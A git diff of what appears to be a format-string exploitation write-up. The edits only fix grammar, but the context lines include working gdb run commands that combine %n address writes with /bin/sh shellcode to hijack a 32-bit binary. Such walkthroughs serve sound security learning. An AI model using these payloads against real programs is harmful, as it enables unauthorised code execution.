@@ -748,11 +748,11 @@ gef➤  x/100wx $esp - 0xfc
 gef➤  
 ```
 
-You can see that the shellcode address was written. BUT, for me it doesn't work. So, now, I'm trying to solve the problem: the program jumps to shellcode but doesn't execute it properly...
+You can see that the shellcode address was written. BUT, for me, it doesn't work. So, now, I'm trying to solve the problem: the program jumps to shellcode but doesn't execute it properly...
 
 Okay, I solved it. The problem was in shellcode. It stops working :) So, I just took [another one](http://shell-storm.org/shellcode/files/shellcode-585.php "http://shell-storm.org/shellcode/files/shellcode-585.php") from the [shellcode database](http://shell-storm.org/shellcode/ "http://shell-storm.org/shellcode/").
 
-Here, you need to do the same calculations that was above, but the shellcode will be after format string things.
+Here, you need to do the same calculations that were above, but the shellcode will be after format string things.
 
 ```bash
 gef➤  r $(python -c 'print "\xac\xcf\xff\xff" + "\xae\xcf\xff\xff" + "%52958u" + "%6$n" + "%12569u" + "%7$n" + "\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"')
@@ -885,7 +885,7 @@ gef➤  x/106wx $esp - 0x106
 0xffffd076:	0xd278ffff	0x0000ffff
 ```
 
-The shellcode now is at `0xffffcf16`. How can i determine where the shellcode starts? By the start of the shellcode! `\xeb\x0b\x5b\x31` is `0x315b0beb` which showed above.
+The shellcode now is at `0xffffcf16`. How can I determine where the shellcode starts? By the start of the shellcode! `\xeb\x0b\x5b\x31` is `0x315b0beb` which showed above.
 
 ```bash
 gef➤  r $(python -c 'print "\xdc\xcf\xff\xff" + "\xde\xcf\xff\xff" + "%53006u" + "%6$n" + "%12569u" + "%7$n" + "\xeb\x0b\x5b\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\xcd\x80\xe8\xf0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"')
